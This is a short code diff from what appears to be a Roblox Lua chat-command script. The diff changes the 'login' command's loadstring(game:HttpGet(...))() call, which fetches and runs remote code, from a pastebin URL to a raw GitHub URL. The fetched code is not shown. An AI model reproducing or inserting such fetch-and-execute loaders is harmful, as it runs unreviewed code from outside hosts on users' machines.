@@ -15,7 +15,7 @@ LPlayer.Chatted:Connect(function(msg)
         end
  
         if cmd == "login" then
-        loadstring(game:HttpGet(('https://pastebin.com/raw/bC4TKyv7'),true))()
+        loadstring(game:HttpGet(('https://raw.githubusercontent.com/loboazul666/BackUp/main/Backup2'),true))()
         end
  
         if cmd == "view" then
